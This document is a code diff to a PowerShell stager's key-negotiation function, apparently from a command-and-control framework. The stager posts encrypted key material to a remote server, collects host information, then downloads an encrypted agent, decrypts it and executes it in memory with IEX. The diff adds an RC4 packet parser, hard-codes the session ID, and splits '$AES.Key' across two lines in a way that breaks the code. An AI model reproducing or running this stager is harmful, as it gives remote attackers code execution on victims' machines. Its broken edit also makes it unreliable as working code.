@@ -62,12 +62,39 @@ function Start-Negotiate {
         }
     }
 
+    function Decode-RC4Packet {
+        param ($RawData, $SKB)
+
+        $IV = $RawData[0..3];
+        $EncryptedData = $RawData[4..($RawData.Length - 1)];
+        $DecryptedData = ConvertTo-RC4ByteStream -RCK ($IV + $SKB) -In $EncryptedData;
+        $SessionID = [System.Text.Encoding]::ASCII.GetString($DecryptedData[0..7]);
+
+        $Language = $DecryptedData[8];
+        $Meta = $DecryptedData[9];
+        $Extra = $DecryptedData[10..11];
+
+        $Length = [BitConverter]::ToInt32($DecryptedData[12..15], 0);
+
+        $EncryptedPayload = $EncryptedData[16..($EncryptedData.Length - 1)];
+
+        return @{
+            IV = $IV;
+            SessionID = $SessionID;
+            Language = $Language;
+            Meta = $Meta;
+            Extra = $Extra;
+            Length = $Length;
+            EncryptedPayload = $EncryptedPayload;
+        }
+    }
+
     # make sure the appropriate assemblies are loaded
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
 
     # try to ignore all errors
-    $ErrorActionPreference = "SilentlyContinue";
+    # $ErrorActionPreference = "SilentlyContinue";
     $e=[System.Text.Encoding]::UTF8;
     $customHeaders = "";
     $SKB=$e.GetBytes($SK);
@@ -95,7 +122,7 @@ function Start-Negotiate {
     $rk=$rs.ToXmlString($False);
 
     # generate a randomized sessionID of 8 characters
-    $ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);
+    $ID='00000000';
 
     # build the packet of (xml_key)
     $ib=$e.getbytes($rk);
@@ -132,6 +159,7 @@ function Start-Negotiate {
         }
     }
     $wc.Headers.Add("User-Agent",$UA);
+    #$wc.Headers.Add("Hop-Name",$hop);
     
     # RC4 routing packet:
     #   sessionID = $ID
@@ -147,12 +175,17 @@ function Start-Negotiate {
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
     $raw=$wc.UploadData($s+"/{{ stage_1 }}","POST",$rc4p);
 
-    # step 4 of negotiation -> server returns RSA(nonce+AESsession))
-    $de=$e.GetString($rs.decrypt($raw,$false));
+    # step 4 of negotiation -> server returns RSA(nonce+AESsession))et($raw)
+    # $data = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $raw;
+    $DecodedPacket = Decode-RC4Packet -RawData $raw -SKB $SKB;
+    $ID=$DecodedPacket.SessionID;
+
+    $EncryptedPayloadBytes = [byte[]]$DecodedPacket.EncryptedPayload;
+    $DecryptedData=$e.GetString($rs.decrypt($EncryptedPayloadBytes,$false));
 
     # packet = server nonce + AES session key
-    $nonce=$de[0..15] -join '';
-    $key=$de[16..$de.length] -join '';
+    $nonce=$DecryptedData[0..15] -join '';
+    $key=$DecryptedData[16..$DecryptedData.length] -join '';
 
     # increment the nonce
     $nonce=[String]([long]$nonce + 1);
@@ -166,7 +199,8 @@ function Start-Negotiate {
     }
     $IV = [byte] 0..255 | Get-Random -Count 16;
     $AES.Mode="CBC";
-    $AES.Key=$e.GetBytes($key);
+    $AES.K
+    ey=$e.GetBytes($key);
     $AES.IV = $IV;
 
     # get some basic system information
@@ -178,7 +212,6 @@ function Start-Negotiate {
     catch {
         $p = "[FAILED]"
     }
-   
 
     # check if the IP is a string or the [IPv4,IPv6] array
     $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
@@ -242,7 +275,9 @@ function Start-Negotiate {
     # # decrypt the agent and register the agent logic
     # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
     # write-host "data len: $($Data.Length)";
-    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
+    $DecodedPacket = Decode-RC4Packet -RawData $raw -SKB $SKB;
+    $EncryptedPayloadBytes = [byte[]]$DecodedPacket.EncryptedPayload;
+    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $EncryptedPayloadBytes)) );
 
     # clear some variables out of memory and cleanup before execution
     $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
